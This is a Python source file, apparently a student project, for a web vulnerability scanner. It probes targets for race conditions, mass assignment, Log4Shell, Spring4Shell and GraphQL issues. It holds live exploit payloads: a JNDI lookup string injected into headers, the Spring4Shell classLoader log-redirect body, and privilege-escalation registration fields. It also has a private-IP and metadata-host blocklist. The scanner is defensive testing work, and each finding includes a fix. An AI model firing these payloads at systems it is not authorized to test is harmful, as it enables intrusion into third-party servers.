"""
═══════════════════════════════════════════════════════════════
  CYBRAIN — URL Scanner Orchestrator  (v2.1 Final)
  Integrates OWASPChecker + ExtendedChecks + ReportGenerator
  PFE Master 2 — Information Security
  University of Mohamed Boudiaf, M'sila — Algeria

  WHAT'S IN THIS FILE
  ───────────────────
  UrlScanner          — main orchestrator (drop-in replacement)
  ExtendedChecks      — 4 new modules bound onto OWASPChecker:
      _race_condition           CWE-362
      _mass_assignment          CWE-915
      _log4shell_spring4shell   CVE-2021-44228 / CVE-2022-22965
      _graphql_checks           introspection + batch + API versions

  FIXES vs original
  ─────────────────
  • Private-IP blocklist  — prevents scanning 10.x/192.168.x/127.x
  • _calc_overall_risk    — uses raw findings, not UI-formatted list
  • executor.map break bug — replaced with as_completed + cancel flag
  • Connection retry      — 3 attempts with 1.5 s backoff
  • Path-traversal guard  — see app.py /download_fixed route note

  FOR EDUCATIONAL / AUTHORIZED TESTING ONLY
═══════════════════════════════════════════════════════════════
"""

import os
import re
import json
import time
import base64
import types
import threading
import urllib3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from ipaddress import ip_address, ip_network, AddressValueError

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Browser UA ─────────────────────────────────────────────────────────────
BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/122.0.0.0 Safari/537.36"
)

# ── Severity sort map ──────────────────────────────────────────────────────
SEVERITY_MAP = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}

# ── Private / reserved IP ranges — scanning these is blocked ──────────────
_PRIVATE_NETS = [
    ip_network("10.0.0.0/8"),
    ip_network("172.16.0.0/12"),
    ip_network("192.168.0.0/16"),
    ip_network("127.0.0.0/8"),
    ip_network("169.254.0.0/16"),   # link-local / AWS metadata
    ip_network("100.64.0.0/10"),    # carrier-grade NAT
]
_BLOCKED_HOSTS = {
    "localhost",
    "metadata.google.internal",
    "169.254.169.254",
    "instance-data",
}


def _is_private_target(url: str) -> bool:
    """Return True if URL points to a private/reserved IP or blocked hostname."""
    try:
        host = urlparse(url).hostname or ""
        # Literal IP address?
        ip = ip_address(host)
        return any(ip in net for net in _PRIVATE_NETS)
    except (AddressValueError, ValueError):
        host = (urlparse(url).hostname or "").lower()
        return host in _BLOCKED_HOSTS


def calc_overall_risk(findings: list) -> str:
    """
    Shared risk calculator.
    Works on raw findings dicts (key='severity') OR formatted UI dicts.
    Safe to call before scan() — returns 'INFO' on empty list.
    """
    for level in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
        if any(f.get("severity") == level for f in findings):
            return level
    return "INFO"


# ══════════════════════════════════════════════════════════════════════════════
#  EXTENDED CHECKS — Race Condition, Mass Assignment, Log4Shell, GraphQL
#  These are mixed into OWASPChecker at runtime via _attach_extended()
#  so they share the same session, findings list, lock, and _get/_post helpers.
# ══════════════════════════════════════════════════════════════════════════════

class ExtendedChecks:
    """
    Mixin class. Methods are bound onto an OWASPChecker instance at runtime.
    self.* references below resolve to OWASPChecker attributes.
    """

    # ── 1. RACE CONDITION (CWE-362) ────────────────────────────────────────
    def _race_condition(self):
        """
        Fire N simultaneous identical POST requests to state-changing endpoints.
        If ≥ THRESHOLD succeed, the endpoint lacks atomic locking.
        Classic targets: coupon redemption, voting, balance transfers.
        """
        print("[EXT] Race Condition (CWE-362)...")

        race_paths = [
            "/api/redeem",   "/api/vote",      "/api/like",
            "/api/transfer", "/api/coupon",    "/api/checkout",
            "/api/apply",    "/coupon/redeem", "/promo/apply",
            "/api/v1/redeem",
        ]
        THREADS   = 15
        THRESHOLD = 2

        payload = {
            "code":   "CYBRAIN2025",
            "coupon": "CYBRAIN2025",
            "promo":  "CYBRAIN2025",
            "amount": 1,
            "vote":   1,
        }
        success_signs = [
            "success", "redeemed", "applied", "credited",
            "accepted", "valid", "discount", "true",
        ]

        for path in race_paths:
            probe = self._get(f"{self.base}{path}")
            if not probe or probe.status_code not in (200, 405, 422):
                continue

            responses = []
            lock = threading.Lock()

            def _fire(_, _url=f"{self.base}{path}", _pl=payload):
                r = self._post(_url, json_data=_pl)
                if r:
                    with lock:
                        responses.append(r)

            with ThreadPoolExecutor(max_workers=THREADS) as ex:
                list(ex.map(_fire, range(THREADS)))

            hits = sum(
                1 for r in responses
                if r.status_code == 200 and
                any(s in r.text.lower() for s in success_signs)
            )

            if hits >= THRESHOLD:
                self._add(
                    "A01:2025", "Broken Access Control", "HIGH",
                    f"Race Condition — {path}",
                    f"Endpoint {path} processed {hits}/{THREADS} simultaneous "
                    "identical requests successfully. A protected endpoint should "
                    "succeed only once. Attackers exploit this to redeem coupons "
                    "multiple times, double-spend credits, or submit duplicate votes.",
                    evidence=f"{THREADS} concurrent POST {path} → {hits} × HTTP 200 success",
                    fix=(
                        "1. Use database-level atomic operations (SELECT FOR UPDATE).\n"
                        "2. Redis SETNX / distributed mutex before processing.\n"
                        "3. Idempotency keys — ignore duplicate requests.\n"
                        "4. Mark resource 'used' in a single atomic transaction."
                    ),
                    cwe="CWE-362", cvss="7.5", sans="SANS #20",
                )
                break

    # ── 2. MASS ASSIGNMENT (CWE-915) ──────────────────────────────────────
    def _mass_assignment(self):
        """
        Send privileged fields (isAdmin, role, balance) in registration/update
        payloads. If the server reflects them back, mass assignment is present.
        """
        print("[EXT] Mass Assignment (CWE-915)...")

        endpoints = [
            ("/api/register",    "POST"),
            ("/api/user",        "PUT"),
            ("/api/profile",     "PUT"),
            ("/api/v1/users",    "POST"),
            ("/api/v2/users",    "POST"),
            ("/register",        "POST"),
            ("/user/update",     "POST"),
            ("/account/update",  "POST"),
        ]

        attack_payload = {
            "username":    "cybrain_test",
            "email":       "cybrain@test.com",
            "password":    "Test@1234!",
            # ← privileged injection fields ↓
            "isAdmin":     True,
            "role":        "admin",
            "balance":     99999,
            "credits":     99999,
            "is_staff":    True,
            "is_superuser":True,
            "verified":    True,
            "plan":        "enterprise",
            "permissions": ["read", "write", "admin"],
        }

        reflected_keys = [
            "isadmin", "role", "balance", "credits",
            "is_staff", "is_superuser", "verified",
            "plan", "permissions",
        ]

        for path, _ in endpoints:
            r = self._post(f"{self.base}{path}", json_data=attack_payload)
            if not r or r.status_code not in (200, 201):
                continue

            body = r.text.lower()
            reflected = [k for k in reflected_keys if k in body]

            if reflected or ("admin" in body and r.status_code in (200, 201)):
                self._add(
                    "A06:2025", "Insecure Design", "HIGH",
                    f"Mass Assignment — {path}",
                    f"Endpoint {path} accepted privileged fields "
                    f"({', '.join(reflected) or 'admin'}) and reflected them. "
                    "Attacker can set isAdmin=true during registration.",
                    evidence=f"POST {path} isAdmin=true → HTTP {r.status_code}, reflected: {reflected}",
                    fix=(
                        "1. Use an explicit allowlist (DTO/schema) — never bind raw body to model.\n"
                        "2. Django: explicit 'fields' in ModelForm.\n"
                        "3. Rails: strong_parameters permit().\n"
                        "4. Flask: manually extract only allowed keys from request.json."
                    ),
                    cwe="CWE-915", cvss="8.1",
                )
                break

    # ── 3. LOG4SHELL / SPRING4SHELL ───────────────────────────────────────
    def _log4shell_spring4shell(self):
        """
        CVE-2021-44228 (Log4Shell) — passive canary injection via HTTP headers.
        CVE-2022-22965 (Spring4Shell) — Spring MVC class-binding probe.
        No exploitation — detection only.
        """
        print("[EXT] Log4Shell / Spring4Shell...")

        L4S = "${jndi:ldap://cybrain-log4shell-canary.invalid/a}"

        inject_headers = {
            "X-Api-Version":    L4S,
            "User-Agent":       L4S,
            "X-Forwarded-For":  L4S,
            "Referer":          L4S,
            "X-Forwarded-Host": L4S,
            "Accept-Language":  L4S,
            "Authorization":    f"Bearer {L4S}",
            "CF-Connecting-IP": L4S,
            "True-Client-IP":   L4S,
        }

        l4s_signs = [
            "jndi", "ldap://", "rmi://", "javax.naming",
            "NamingException", "log4j", "java.lang.reflect",
        ]

        try:
            r = self.session.get(
                self.target,
                headers={**{"User-Agent": BROWSER_UA}, **inject_headers},
                timeout=self.timeout, verify=False, allow_redirects=True,
            )
            if r and (L4S in r.text or any(s in r.text.lower() for s in l4s_signs)):
                self._add(
                    "A03:2025", "Software Supply Chain Failures", "CRITICAL",
                    "Log4Shell (CVE-2021-44228) — JNDI Injection Indicator",
                    "JNDI canary string injected via HTTP headers triggered a "
                    "log4j/JNDI indicator in the response. Log4Shell allows full "
                    "RCE on any server running Log4j 2.0–2.14.",
                    evidence=f"Injected header {L4S[:60]} → indicator in response",
                    fix=(
                        "1. Upgrade Log4j to 2.17.1+.\n"
                        "2. JVM flag: -Dlog4j2.formatMsgNoLookups=true\n"
                        "3. Remove JndiLookup.class from log4j-core jar.\n"
                        "4. WAF rules blocking ${jndi: patterns."
                    ),
                    cwe="CWE-917", cvss="10.0",
                )
        except Exception:
            pass

        # Spring4Shell probe
        spring_payload = (
            "class.module.classLoader.resources.context"
            ".parent.pipeline.first.pattern=%25%7Bc2%7Di"
            "&class.module.classLoader.resources.context"
            ".parent.pipeline.first.suffix=.jsp"
            "&class.module.classLoader.resources.context"
            ".parent.pipeline.first.directory=webapps/ROOT"
            "&class.module.classLoader.resources.context"
            ".parent.pipeline.first.prefix=cybrain_s4s"
            "&class.module.classLoader.resources.context"
            ".parent.pipeline.first.fileDateFormat="
        )
        spring_signs = ["spring", "springframework", "classloader", "whitelabel", "tomcat"]

        for path in ["/", "/login", "/api/", "/register"]:
            try:
                r = self.session.post(
                    f"{self.base}{path}", data=spring_payload,
                    headers={"Content-Type": "application/x-www-form-urlencoded",
                             "User-Agent": BROWSER_UA},
                    timeout=self.timeout, verify=False,
                )
                if r and r.status_code in (200, 400, 500):
                    if any(s in r.text.lower() for s in spring_signs):
                        self._add(
                            "A03:2025", "Software Supply Chain Failures", "CRITICAL",
                            "Spring4Shell (CVE-2022-22965) — Class Binding Indicator",
                            f"Spring MVC class-binding payload at {path} triggered a "
                            "Spring/Tomcat indicator. Spring4Shell allows RCE on "
                            "Spring MVC apps running on JDK 9+ with Tomcat.",
                            evidence=f"POST {path} class.module.classLoader → HTTP {r.status_code}",
                            fix=(
                                "1. Upgrade Spring Framework to 5.3.18+ / 5.2.20+.\n"
                                "2. Upgrade Spring Boot to 2.6.6+ / 2.5.12+.\n"
                                "3. @InitBinder: binder.setDisallowedFields('class.*', 'Class.*')."
                            ),
                            cwe="CWE-94", cvss="9.8",
                        )
                        break
            except Exception:
                pass

    # ── 4. GRAPHQL (CWE-200 / CWE-770) ────────────────────────────────────
    def _graphql_checks(self):
        """
        Check for: introspection enabled, batch query abuse, old API versions.
        """
        print("[EXT] GraphQL + API versioning...")

        gql_paths = [
            "/graphql", "/api/graphql", "/graphiql",
            "/graphql/console", "/api/v1/graphql",
            "/api/v2/graphql", "/query", "/gql",
        ]

        introspection = {"query": "{ __schema { queryType { name } types { name kind } } }"}
        batch         = [{"query": "{ __typename }"}] * 5

        for path in gql_paths:
            r = self._post(f"{self.base}{path}", json_data=introspection)
            if not r or r.status_code not in (200, 400):
                continue

            if "__schema" in r.text or "querytype" in r.text.lower():
                self._add(
                    "A02:2025", "Security Misconfiguration", "MEDIUM",
                    f"GraphQL Introspection Enabled — {path}",
                    f"GraphQL at {path} exposes full schema via introspection. "
                    "Attackers map the entire API surface before targeted attacks.",
                    evidence=f"POST {path} {{__schema{{types{{name}}}}}} → schema data",
                    fix=(
                        "Disable introspection in production:\n"
                        "Apollo Server: introspection: false\n"
                        "Graphene-Python: graphene.Schema(introspection=False)"
                    ),
                    cwe="CWE-200", cvss="5.3",
                )

                # Batch abuse
                rb = self._post(f"{self.base}{path}", json_data=batch)
                if rb and rb.status_code == 200:
                    try:
                        parsed = rb.json()
                        if isinstance(parsed, list) and len(parsed) >= 3:
                            self._add(
                                "A06:2025", "Insecure Design", "MEDIUM",
                                f"GraphQL Batch Query Abuse — {path}",
                                f"Endpoint {path} accepts batched queries — "
                                "brute-force possible in single HTTP request.",
                                evidence=f"POST {path} [5 queries] → {len(parsed)} results",
                                fix="Apollo: allowBatchedHttpRequests: false. Add query depth limits.",
                                cwe="CWE-770", cvss="5.8",
                            )
                    except Exception:
                        pass
                break  # found live GraphQL endpoint

        # Old API versions
        version_paths = [
            "/api/v1", "/api/v2", "/api/v3",
            "/v1", "/v2", "/v3",
            "/rest/v1", "/rest/v2",
        ]
        exposed = []
        for path in version_paths:
            r = self._get(f"{self.base}{path}")
            if r and r.status_code == 200:
                body = r.text.lower()
                if not any(s in body for s in ["<!doctype html", "<html", "bundle.js"]):
                    exposed.append(path)

        if len(exposed) > 1:
            self._add(
                "A02:2025", "Security Misconfiguration", "LOW",
                "Multiple API Versions Exposed",
                f"Old API versions accessible: {', '.join(exposed[:5])}. "
                "Older versions often lack current security controls.",
                evidence=f"HTTP 200: {', '.join(exposed[:5])}",
                fix=(
                    "Deprecate and remove old API versions.\n"
                    "Return 410 Gone for retired versions."
                ),
                cwe="CWE-1059", cvss="4.3",
            )


# ══════════════════════════════════════════════════════════════════════════════
#  URL SCANNER — Main Orchestrator
# ══════════════════════════════════════════════════════════════════════════════

class UrlScanner:
    """
    Drop-in replacement for the original url_scanner.py.

    Flow
    ────
    1. Validate target (block private IPs)
    2. Check connection (3 retries, 1.5 s backoff)
    3. Run OWASPChecker.run_all()  — A01–A10 + CWE/SANS (8 parallel threads)
    4. Run ExtendedChecks          — Race, MassAssign, Log4Shell, GraphQL
    5. Deduplicate + sort by severity
    6. Generate Markdown + CSV report
    7. Return formatted list for React UI

    API (identical to original)
    ───────────────────────────
    scanner = UrlScanner(url)
    results = scanner.scan()          → list[dict]
    risk    = scanner._calc_overall_risk()  → str
    """

    def __init__(self, target_url: str):
        self.target_url = target_url.strip()
        if not self.target_url.startswith(("http://", "https://")):
            self.target_url = "http://" + self.target_url

        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": BROWSER_UA})

        self.last_findings: list = []   # UI-formatted (for _calc_overall_risk compat)
        self._raw_findings:  list = []   # raw dicts   (for accurate risk calc)

        # Private IP guard
        if _is_private_target(self.target_url):
            self._blocked   = True
            self.connected  = False
            print(f"[CYBRAIN] BLOCKED — {self.target_url} resolves to private IP")
        else:
            self._blocked  = False
            self.connected = self._check_connection()

    # ── Connection check ───────────────────────────────────────────────────
    def _check_connection(self) -> bool:
        for attempt in range(3):
            try:
                resp = self.session.get(
                    self.target_url, timeout=12, allow_redirects=True
                )
                self.target_url = resp.url.rstrip("/")
                return True
            except Exception as e:
                print(f"[!] Connection attempt {attempt + 1} failed: {e}")
                if attempt < 2:
                    time.sleep(1.5)
        return False

    # ── Bind ExtendedChecks methods onto OWASPChecker instance ────────────
    @staticmethod
    def _attach_extended(checker) -> None:
        for name in (
            "_race_condition",
            "_mass_assignment",
            "_log4shell_spring4shell",
            "_graphql_checks",
        ):
            method = getattr(ExtendedChecks, name)
            setattr(checker, name, types.MethodType(method, checker))

    # ── Main scan ──────────────────────────────────────────────────────────
    def scan(self) -> list:

        # ── Blocked ────────────────────────────────────────────────────────
        if self._blocked:
            return [{
                "severity": "INFO",
                "code":     "Target Blocked",
                "message":  (
                    "<p>Scanning private/internal IP ranges is disabled.</p>"
                    "<strong>Reason:</strong> Target resolves to a private "
                    "or reserved IP address (10.x / 192.168.x / 127.x / etc)."
                ),
                "file": self.target_url,
                "line": "-",
            }]

        # ── Unreachable ────────────────────────────────────────────────────
        if not self.connected:
            return [{
                "severity": "CRITICAL",
                "code":     "Target Unreachable",
                "message":  (
                    "<p>Could not establish connection to the target URL.</p>"
                    "<strong>Suggestions:</strong><br>"
                    "• Verify the URL is correct and server is running<br>"
                    "• Try: http://testphp.vulnweb.com<br>"
                    "• Try: https://demo.testfire.net"
                ),
                "file": self.target_url,
                "line": "-",
            }]

        print(f"\n[CYBRAIN] {'═'*47}")
        print(f"[CYBRAIN] SCAN START : {self.target_url}")
        print(f"[CYBRAIN] Time       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[CYBRAIN] {'═'*47}")

        # ── OWASPChecker ───────────────────────────────────────────────────
        from owasp_checks import OWASPChecker
        checker = OWASPChecker(self.target_url, self.session)
        self._attach_extended(checker)

        # Core scan — A01–A10 + CWE/SANS extras (parallel inside run_all)
        checker.run_all()

        # Extended checks — sequential after core
        for name in (
            "_race_condition",
            "_mass_assignment",
            "_log4shell_spring4shell",
            "_graphql_checks",
        ):
            try:
                getattr(checker, name)()
            except Exception as e:
                print(f"[!] Extended check {name} failed: {e}")

        # ── Deduplicate ────────────────────────────────────────────────────
        seen:   set  = set()
        unique: list = []
        for f in checker.findings:
            if f["title"] not in seen:
                unique.append(f)
                seen.add(f["title"])

        # ── Sort CRITICAL → INFO ───────────────────────────────────────────
        unique.sort(
            key=lambda x: SEVERITY_MAP.get(x.get("severity", "INFO"), 0),
            reverse=True,
        )

        self._raw_findings = unique
        print(f"[CYBRAIN] SCAN COMPLETE : {len(unique)} unique findings")

        # ── Generate Markdown + CSV report ────────────────────────────────
        try:
            report_dir = os.path.join(
                os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                "report",
            )
            os.makedirs(report_dir, exist_ok=True)
            from report_generator import ReportGenerator
            ReportGenerator(self.target_url, unique, report_dir).generate_all()
        except Exception as e:
            print(f"[!] Report generation failed: {e}")

        # ── Format for React UI ────────────────────────────────────────────
        formatted: list = []
        for f in unique:
            cwe_id  = f.get("cwe", "").replace("CWE-", "")
            cwe_url = (
                f"https://cwe.mitre.org/data/definitions/{cwe_id}.html"
                if cwe_id else "#"
            )
            message_html = (
                f"<p>{f.get('description', '')}</p>"
                f"<strong>Evidence:</strong><br>"
                f"<code>{f.get('evidence', 'N/A')}</code><br><br>"
                f"<strong>Recommendation:</strong><br>"
                f"{f.get('fix', 'N/A')}<br><br>"
                f"<strong>CWE:</strong> "
                f"<a href='{cwe_url}' target='_blank'>"
                f"{f.get('cwe', 'N/A')}</a><br>"
                f"<strong>OWASP 2025:</strong> "
                f"{f.get('owasp_id', 'N/A')} — {f.get('owasp_name', 'N/A')}<br>"
                f"<strong>CVSS Score:</strong> {f.get('cvss', 'N/A')}<br>"
                f"<strong>SANS/CWE Top 25:</strong> {f.get('sans', 'N/A')}"
            )
            formatted.append({
                "severity": f.get("severity", "INFO"),
                "code":     f.get("title", "Unknown"),
                "message":  message_html,
                "file":     self.target_url,
                "line":     "-",
            })

        self.last_findings = formatted
        return formatted

    # ── Overall risk ───────────────────────────────────────────────────────
    def _calc_overall_risk(self) -> str:
        """
        Uses raw findings for accurate severity calculation.
        Falls back to UI-formatted list if called before scan().
        Compatible with original API used by app.py.
        """
        return calc_overall_risk(self._raw_findings or self.last_findings)


# ── CLI entry point ────────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://testphp.vulnweb.com"

    scanner = UrlScanner(target)
    results = scanner.scan()

    print(f"\n{'═'*50}")
    print(f"  Total findings : {len(results)}")
    print(f"  Overall risk   : {scanner._calc_overall_risk()}")
    print(f"{'═'*50}")
    for r in results:
        print(f"  [{r['severity']:8}] {r['code']}")